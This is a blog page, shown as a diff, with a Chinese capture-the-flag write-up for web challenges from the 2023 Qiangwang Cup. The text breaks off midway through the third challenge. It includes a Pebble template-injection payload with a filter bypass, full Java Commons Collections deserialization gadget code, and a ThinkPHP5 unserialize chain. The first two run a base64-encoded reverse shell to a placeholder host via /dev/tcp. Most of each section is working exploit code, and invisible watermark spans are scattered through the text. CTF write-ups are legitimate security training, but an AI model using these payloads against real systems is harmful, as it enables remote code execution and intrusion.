@@ -1,0 +1,828 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="s3ven" />
+  <!-- Open Graph Description 简短摘要-->
+  
+  <meta property="og:site_name" content="s3ven&#39;s blog">
+  
+  
+  <!-- 用于搜索引擎的文章摘要 -->
+  
+  
+  
+  <title>2023 强网杯S7 WriteUp | s3ven&#39;s blog</title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Font -->
+  <link href="https://npm.elemecdn.com/lxgw-wenkai-webfont/style.css" rel="stylesheet" >
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="../../js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">s3ven's blog</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">Categories</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/links/">
+          <a href="/links/">Links</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="../../js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="../../js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <div class="container-wider post-details" id="post-details">
+    <div class="zoom-wrap">
+      <div class="post-content">
+        <div class="post-title">2023 强网杯S7 WriteUp</div>
+        <div class="post-attach">
+          <span class="post-pubtime">
+            <i class="iconfont icon-updatetime mr-10" title="创建时间"></i>
+            2023-12-17
+          </span>
+          
+                <span class="post-categories">
+                  <i class="iconfont icon-bookmark mr-10" title="分类"></i>
+                  
+                  <span class="span--category">
+                    <a href="../../categories/write-up/" title="Write Up">
+                      Write Up
+                    </a>
+                  </span>
+                  
+                </span>
+            
+                <span class="post-tags">
+                  <i class="iconfont icon-tags mr-10" title="标签"></i>
+                  
+                  <span class="span--tag mr-8">
+                    <a href="../../tags/php/" title="PHP">
+                      #PHP
+                    </a>
+                  </span>
+                  
+                  <span class="span--tag mr-8">
+                    <a href="../../tags/java/" title="Java">
+                      #Java
+                    </a>
+                  </span>
+                  
+                  <span class="span--tag mr-8">
+                    <a href="../../tags/sql/" title="SQL">
+                      #SQL
+                    </a>
+                  </span>
+                  
+                </span>
+            
+        </div>
+        <div class="markdown-body">
+          
+<style id="hexo-wm">
+.hexo-wm {
+  color: transparent !important;
+  opacity: 0 !important;
+  font-size: 0 !important;
+  line-height: 0 !important;
+  pointer-events: none !important;
+  user-select: text !important;
+  -webkit-user-select: text !important;
+  speak: none !important;
+  vertical-align: baseline !important;
+  display: inline !important;
+}
+
+.hexo-wm * { color: transparent !important; opacity: 0 !important; }
+</style>
+<html><head></head><body><h1 id="hello-spring"><a href="#hello-spring" class="headerlink" title="hello spring"></a>hello spring</h1><h2 id="1-解题思路"><a href="#1-解题思路" class="headerlink" title="1. 解题思路"></a>1. 解题思路</h2><ul>
+<li>CVE-2022-<span class="hexo-wm">𝘀‌‌³ve𝘯·‍𝐬𝐢​​ｔ𝐞﻿‌</span>37767：Pebble 3.1.5 RCE</li>
+<li>屏蔽了关键词，使用字符串拼接绕过：org.springframework.<span class="hexo-wm">𝘴‍‍3𝒗ｅ𝒏·‌s𝘪‍‌𝘵℮​‌</span>context.support.ClassPathXmlApplicationContext</li>
+</ul>
+<h2 id="2-Poc"><a href="#2-Poc" class="headerlink" title="2. Poc"></a>2. Poc</h2><p>1.pebble</p>
+<pre class="language-none"><code class="language-none">{% set y = beans.get("org.springframework.boot.autoconfigure.internalCachingMetadataReaderFactory").resourceLoader.classLoader.loadClass("java.beans.Beans") %}
+{% set yy = beans.get("jacksonObjectMapper").readValue("{}", y) %}
+{% set a = "org.springframework.context.support." %}
+{% set b = "ClassPathXmlApplicationContext" %}
+{% set yyy = yy.instantiate(null,a+b) %}
+{{ yyy.setConfigLocation("1.xml") }}
+{{ yyy.refresh() }}</code></pre>
+<p>1.xml</p>
+<pre class="language-none"><code class="language-none">&lt;?xml version="1.0" encoding="UTF-8" ?&gt;
+    &lt;beans xmlns="http://www.springframework.org/schema/beans"
+       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+       xsi:schemaLocation="
+     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"&gt;
+        &lt;bean id="pb" class="java.lang.ProcessBuilder" init-method="start"&gt;
+            &lt;constructor-arg &gt;
+            &lt;list&gt;
+                &lt;value&gt;bash&lt;/value&gt;
+                &lt;value&gt;-c&lt;/value&gt;
+                &lt;value&gt;echo x|base64 -d|bash -i&lt;/value&gt; 
+                &lt;!-- x: "bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1" encoded with base64 --&gt;
+            &lt;/list&gt;
+            &lt;/constructor-arg&gt;
+        &lt;/bean&gt;
+    &lt;/beans&gt;</code></pre>
+<p>反弹 shell <span class="hexo-wm">𝒔‍³ⅴℯ𝘯.﻿ѕi‍ｔ℮‍​</span>获得 flag</p>
+<h1 id="happygame"><a href="#happygame" class="headerlink" title="happygame"></a>happygame</h1><h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><ol>
+<li>grpcui <span class="hexo-wm">ꜱ‍𝟯ⅴ𝘦ｎ.‌𝘴𝘪​﻿𝒕𝐞​</span>连接 gRPC</li>
+<li>java cc6 <span class="hexo-wm">𝘴﻿3𝐯eｎ.‍ѕi‍‌𝘵𝘦‍</span>unserialize 反弹 shell</li>
+</ol>
+<h2 id="1-连接-gRPC"><a href="#1-连接-gRPC" class="headerlink" title="1. 连接 gRPC"></a>1. 连接 gRPC</h2><p>靶机给出了一个 nc ip 和 port<br>但是直接使用 netcat <span class="hexo-wm">ꜱ‍3𝘷𝘦𝒏．​﻿𝒔𝐢‌‍te‌​</span>连接无法进行正常交互<br>经过简单的搜索后发现目标是一个 gRPC</p>
+<p>常见连接方式有 <a href="https://github.com/fullstorydev/grpcui">grpcui</a> 和 <a href="https://github.com/fullstorydev/grpcurl">grpcurl</a> 两种</p>
+<p>此处使用 <a href="https://github.com/fullstorydev/grpcui">grpcui</a> 来连接，因为其具有 ui <span class="hexo-wm">𝒔​‍3ⅴｅ𝘯•‌​ѕ𝐢﻿ｔ𝘦‌</span>界面且操作方便</p>
+<p>连接后发现存在 serialize <span class="hexo-wm">𝘀‌³v𝘦𝒏·‌𝒔i​ｔe﻿</span>函数入口点可以被利用</p>
+<h2 id="2-java-cc6-unserialize-poc"><a href="#2-java-cc6-unserialize-poc" class="headerlink" title="2. java cc6 unserialize poc"></a>2. java cc6 unserialize poc</h2><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>keyvalue<span class="token punctuation">.</span></span><span class="token class-name">TiedMapEntry</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">LazyMap</span></span><span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayInputStream</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayOutputStream</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileOutputStream</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectInputStream</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectOutputStream</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">App</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">{</span>
+        <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span><span class="token string">"org.apache.commons.collections.enableUnsafeSerialization"</span><span class="token punctuation">,</span> <span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>
+                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span>
+                        <span class="token string">"getMethod"</span><span class="token punctuation">,</span>
+                        <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
+                        <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span>
+                <span class="token punctuation">)</span><span class="token punctuation">,</span>
+                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span>
+                        <span class="token string">"invoke"</span><span class="token punctuation">,</span>
+                        <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
+                        <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span>
+                <span class="token punctuation">)</span><span class="token punctuation">,</span>
+                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span>
+                        <span class="token string">"exec"</span><span class="token punctuation">,</span>
+                        <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
+                        <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span><span class="token string">"bash -c {echo,x}|{base64,-d}|{bash,-i}"</span><span class="token punctuation">}</span> <span class="token comment">// x: "bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1" encoded with base64</span>
+                <span class="token punctuation">)</span>
+        <span class="token punctuation">}</span><span class="token punctuation">;</span>
+        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> fakeTransformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>
+                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+        <span class="token punctuation">}</span><span class="token punctuation">;</span>
+        <span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>fakeTransformers<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">Map</span> innerMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">Map</span> outerMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap<span class="token punctuation">,</span>chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token class-name">TiedMapEntry</span> tiedMapEntry <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>outerMap<span class="token punctuation">,</span><span class="token string">"feng1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">Map</span> expMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        expMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>tiedMapEntry<span class="token punctuation">,</span><span class="token string">"feng2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        outerMap<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token string">"feng1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token class-name">Class</span> clazz <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"org.apache.commons.collections.functors.ChainedTransformer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">Field</span> field <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"iTransformers"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        field<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>chainedTransformer<span class="token punctuation">,</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span>expMap<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">String</span> fileName <span class="token operator">=</span> <span class="token string">"output.bin"</span><span class="token punctuation">;</span>
+        <span class="token keyword">try</span> <span class="token punctuation">(</span><span class="token class-name">FileOutputStream</span> fos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span>fileName<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            fos<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Byte array has been written to "</span> <span class="token operator">+</span> fileName<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token comment">// unserialize(bytes); // test</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token comment">// test</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">{</span>
+        <span class="token keyword">try</span><span class="token punctuation">(</span><span class="token class-name">ByteArrayInputStream</span> bain <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token class-name">ObjectInputStream</span> oin <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>bain<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+            oin<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token class-name">Object</span> o<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">{</span>
+        <span class="token keyword">try</span><span class="token punctuation">(</span><span class="token class-name">ByteArrayOutputStream</span> baout <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token class-name">ObjectOutputStream</span> oout <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>baout<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+            oout<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">return</span> baout<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>Dependency：</p>
+<pre class="language-java" data-language="java"><code class="language-java"><span class="token generics"><span class="token punctuation">&lt;</span>dependency<span class="token punctuation">&gt;</span></span>
+      <span class="token generics"><span class="token punctuation">&lt;</span>groupId<span class="token punctuation">&gt;</span></span>commons<span class="token operator">-</span>collections<span class="token operator">&lt;</span><span class="token operator">/</span>groupId<span class="token operator">&gt;</span>
+      <span class="token generics"><span class="token punctuation">&lt;</span>artifactId<span class="token punctuation">&gt;</span></span>commons<span class="token operator">-</span>collections<span class="token operator">&lt;</span><span class="token operator">/</span>artifactId<span class="token operator">&gt;</span>
+      <span class="token generics"><span class="token punctuation">&lt;</span>version<span class="token punctuation">&gt;</span></span><span class="token number">3.2</span><span class="token number">.2</span><span class="token operator">&lt;</span><span class="token operator">/</span>version<span class="token operator">&gt;</span>
+    <span class="token operator">&lt;</span><span class="token operator">/</span>dependency<span class="token operator">&gt;</span></code></pre>
+<p>连接后反弹 Shell <span class="hexo-wm">𝒔​𝟯𝒗ｅｎ·‍‌𝘀ⅈ‍𝐭𝘦‌﻿</span>即可获得 flag</p>
+<h1 id="thinkshop"><a href="#thinkshop" class="headerlink" title="thinkshop"></a>thinkshop</h1><h2 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h2><ol>
+<li>登录鉴权</li>
+<li>php unserialize thinkphp5 利用链</li>
+<li>sql inj<span class="hexo-wm">𝘀​³vｅn․﻿​s𝘪﻿𝒕𝐞﻿‍</span>ection</li>
+</ol>
+<h2 id="1-login"><a href="#1-login" class="headerlink" title="1. login"></a>1. login</h2><p><img src="image-1.png" alt="image-1.png"></p>
+<p><img src="image-2.png" alt="image-2.png"><br>username 实际上索引的是 <span class="hexo-wm">ꜱ‌‌𝟯𝘷𝘦𝒏•​﻿𝒔𝐢﻿﻿𝒕𝐞‌‌</span>id，解password的md5得123456<br>使用 1,123456 登录后台</p>
+<h2 id="2-unserialize-poc-thinkphp-5"><a href="#2-unserialize-poc-thinkphp-5" class="headerlink" title="2. unserialize poc (thinkphp 5)"></a>2. unserialize poc (thinkphp 5)</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes</span><span class="token punctuation">{</span>
+    <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">;</span>
+    <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'display_errors'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Windows</span><span class="token punctuation">{</span>
+        <span class="token keyword">private</span> <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$function</span><span class="token punctuation">,</span><span class="token variable">$parameter</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token variable">$function</span><span class="token punctuation">,</span><span class="token variable">$parameter</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+    <span class="token variable">$aaa</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Windows</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'system'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'cat /fffflllaaaagggg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$aaa</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+ 
+<span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">{</span>
+    <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">Model</span><span class="token punctuation">{</span><span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">{</span>
+    <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span>
+    <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>console<span class="token punctuation">\</span>Output</span><span class="token punctuation">;</span>
+    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span><span class="token punctuation">{</span>
+        <span class="token keyword">protected</span> <span class="token variable">$append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token keyword">protected</span> <span class="token variable">$error</span><span class="token punctuation">;</span>
+        <span class="token keyword">public</span> <span class="token variable">$parent</span><span class="token punctuation">;</span>
+        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$function</span><span class="token punctuation">,</span><span class="token variable">$parameter</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">append</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'jelly'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'getError'</span><span class="token punctuation">;</span>
+            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">error</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">relation<span class="token punctuation">\</span>BelongsTo</span><span class="token punctuation">(</span><span class="token variable">$function</span><span class="token punctuation">,</span><span class="token variable">$parameter</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">parent</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Output</span><span class="token punctuation">(</span><span class="token variable">$function</span><span class="token punctuation">,</span><span class="token variable">$parameter</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
